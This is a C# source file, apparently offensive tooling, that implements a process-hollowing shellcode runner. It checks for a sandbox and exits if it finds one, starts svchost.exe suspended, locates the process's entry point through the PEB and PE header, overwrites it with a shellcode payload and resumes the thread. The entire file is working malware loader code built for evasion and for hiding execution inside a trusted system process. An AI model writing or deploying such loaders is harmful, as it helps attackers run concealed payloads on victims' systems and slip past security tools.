using System;

namespace SCRunner_Hollow
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            bool in_sandbox = Heuristics.EmuCheck();
            if (in_sandbox)
            {
                return;
            }

            string program_name = "C:\\Windows\\System32\\svchost.exe";

            Win32API.STARTUPINFO startup_info = new Win32API.STARTUPINFO();
            Win32API.PROCESS_INFORMATION proc_info = new Win32API.PROCESS_INFORMATION();
            Win32API.PROCESS_BASIC_INFORMATION proc_basic_info = new Win32API.PROCESS_BASIC_INFORMATION();

            bool res = Win32API.CreateProcess(null, program_name, IntPtr.Zero, IntPtr.Zero,
                                      false, 0x4, IntPtr.Zero, null,
                                      ref startup_info, out proc_info);

            uint tmp = 0;
            Win32API.ZwQueryInformationProcess(proc_info.hProcess, 0, ref proc_basic_info,
                                      (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((long)proc_basic_info.PebAddress + 0x10);

            byte[] buffer = new byte[IntPtr.Size];
            Win32API.ReadProcessMemory(proc_info.hProcess, ptrToImageBase, buffer,
                              buffer.Length, out IntPtr bytes_read);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(buffer, 0));

            byte[] data = new byte[0x200];
            Win32API.ReadProcessMemory(proc_info.hProcess, svchostBase, data, data.Length, out bytes_read);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (ulong)svchostBase);

            res = Win32API.WriteProcessMemory(proc_info.hProcess, addressOfEntryPoint, Shellcode.bytes,
                                     Shellcode.bytes.Length, out IntPtr bytes_written);

            Win32API.ResumeThread(proc_info.hThread);
        }
    }
}
